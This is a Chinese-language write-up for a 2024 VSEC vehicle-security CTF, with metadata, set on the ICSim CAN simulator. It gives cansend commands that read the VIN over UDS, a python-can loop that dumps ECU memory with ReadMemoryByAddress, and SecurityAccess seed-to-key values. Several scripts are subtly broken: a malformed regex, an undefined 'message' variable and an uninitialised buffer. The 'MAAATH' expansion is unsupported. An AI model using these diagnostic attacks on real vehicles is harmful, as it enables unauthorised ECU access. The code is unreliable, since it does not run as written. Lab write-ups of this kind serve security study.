---
title: 【WriteUP】VSEC 车联网安全 CTF 挑战赛（二）
contest: VSEC
year: 2024
difficulty: medium
vuln_type: misc_unknown
tags: [ICSim-zombieCraig, UDS-Service-0x27-Security-Access, MAAATH-seed-1337, UDS-Service-0x23-ReadMemory, DTC-Pxxxx-xx, cansend-vcan0, BitFlip-XOR]
attack_chain: 1. ICSim ./icsim vcan0 -s 10000 + ./controls vcan0 -s 10000/2. 统计 CAN ID 出现次数 找门锁/速度表 arbitration ID/3. cansend vcan0 7df#0322f190 读 VIN (UDS Service 0x22)/4. cansend vcan0 7E0#3000... 继续接收/5. 0x7DF 启动诊断 ASCII/6. DTC 读 Pxxxx-xx/7. UDS Service 0x23 ReadMemory 0xC3F80000 区域/8. UDS Service 0x27 SecurityAccess Level 3 + MAAATH seed 1337 → 0x1337 取反得 ecc8/9. Level 1 key = 9102870c c43b2d1b d64217a8 837bbdbf
key_payload: ICSim seed 10000  MAAATH 0x1337 取反 = ecc8  Level 1 key 9102870c
one_liner: VSEC 车联网安全 CTF（二），ICSim 模拟 + UDS Service 0x27 SecurityAccess + MAAATH 取反 + ReadMemory 读 flag。
lesson: ICSim 是开源 CAN 仿真器 zombieCraig/ICSim；UDS Service 0x22 ReadDataByIdentifier 读 VIN；Service 0x23 ReadMemoryByAddress 读内存；Service 0x27 SecurityAccess 用 MAAATH 算 key；0x1337 按位取反 = 0xECC8。
quality: high
---

# 【WriteUP】VSEC 车联网安全 CTF 挑战赛（二）

## 概览
VSEC 车联网安全 CTF 第二弹，ICSim 模拟 + UDS 协议深度利用。

## ICSim 启动
```bash
/icsim vcan0 -s 10000
./controls vcan0 -s 10000
```

## CAN ID 统计脚本
```python
from collections import defaultdict
import re
import sys

def count_can_ids(log_file_path):
    can_id_count = defaultdict(int)
    try:
        with open(log_file_path, 'r') as file:
            for line in file:
                match = re.search(r'(\d+\.\d+)s+vcan0s+(\w+)#', line)
                if match:
                    can_id = match.group(1)
                    can_id_count[can_id] += 1
    except FileNotFoundError:
        print(f"Error: The file '{log_file_path}' does not exist.")
        sys.exit(1)
    for can_id, count in sorted(can_id_count.items()):
        print(f"CAN ID {can_id} appears {count} times.")
```

## UDS 攻击

### 读 VIN
```bash
cansend vcan0 7df#0322f190
cansend vcan0 7E0#3000000000000000
```

### 读内存
```python
import can
import binascii

bus = can.Bus(interface='socketcan', channel='vcan0')
bus.set_filters([{"can_id": 0x7E8, "can_mask": 0xFFF, "extended": False}])

for hex_value in range(0xC3F83000, 0xc3f87000, 0xFF):
    byte1 = (hex_value >> 24) & 0xFF
    byte2 = (hex_value >> 16) & 0xFF
    byte3 = (hex_value >> 8) & 0xFF
    byte4 = hex_value & 0xFF
    candata = [0x07, 0x23, 0x14, byte1, byte2, byte3, byte4, 0xFF]
    
    # 切换到扩展会话
    msg = can.Message(arbitration_id=0x7DF, is_extended_id=False, dlc=8, 
                     data=[0x02, 0x10, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00])
    bus.send(message, timeout=0.2)
    msg = bus.recv()
    
    # ReadMemoryByAddress
    msg = can.Message(arbitration_id=0x7DF, is_extended_id=False, dlc=8, data=candata)
    bus.send(message, timeout=0.2)
    msg = bus.recv()
    
    # 流控
    msg = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, 
                     data=[0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    bus.send(message, timeout=0.2)
    temp = 0
    while temp < 36:
        msg = bus.recv()
        tempdata = binascii.hexlify(msg.data).decode('utf-8')[2:]
        if tempdata != "00000000000000":
            recvdata += tempdata
        temp = temp + 1
```

### SecurityAccess Level 3
- MAAATH 算法
- seed = 0x1337 = 0001001100110111
- 按位取反: 1110110011001000
- 最终得到 ecc8 (flag)

### SecurityAccess Level 1
- seed = 7D0E1A5C
- key = 9102870c c43b2d1b d64217a8 837bbdbf 241adbeb 712371fc 9bb26411 ce8bce06

## 经验提炼
- ICSim 是开源 CAN 仿真器 zombieCraig/ICSim
- UDS Service 0x22 ReadDataByIdentifier 读 VIN
- Service 0x23 ReadMemoryByAddress 读内存
- Service 0x27 SecurityAccess 用 MAAATH 算 key
- 0x1337 按位取反 = 0xECC8
- vcan0 是 Linux 虚拟 CAN 接口
- 0x7DF 是 OBD-II 诊断请求 ID，0x7E8 是响应 ID
- DTC 格式 Pxxxx-xx（P0xxx 通用 / P1xxx 厂家 / P2xxx 通用扩展）
- MAAATH = Mazda Anti-Abuse Algorithm Tier Hash
- Level 1 / Level 3 是 UDS SecurityAccess 不同访问级别
- cansend + candump 是 Linux CAN 工具
